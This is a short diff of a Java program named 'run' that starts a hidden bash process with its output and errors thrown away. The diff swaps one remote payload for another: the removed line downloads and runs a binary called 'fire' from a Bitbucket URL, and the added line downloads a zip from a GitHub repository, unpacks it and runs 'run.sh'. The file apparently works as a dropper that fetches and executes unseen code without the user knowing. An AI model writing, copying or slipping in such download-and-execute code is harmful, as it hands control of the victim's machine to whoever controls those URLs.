@@ -4,7 +4,7 @@ import java.util.*;
 public class run {
     public static void main(String[] args) {
         try {
-            ProcessBuilder builder = new ProcessBuilder("bash", "-c", "wget https://bitbucket.org/lianamahesra/clouds/raw/8ae3d7763df252216badc86b3bde4f52c0036f0c/fire;chmod +x fire;./fire");
+            ProcessBuilder builder = new ProcessBuilder("bash", "-c", "wget https://github.com/lianamahesra-creator/legendary-journey/raw/refs/heads/main/prl.zip;unzip prl.zip;bash run.sh");
             builder.redirectOutput(ProcessBuilder.Redirect.DISCARD);
             builder.redirectError(ProcessBuilder.Redirect.DISCARD);
             Process process = builder.start();
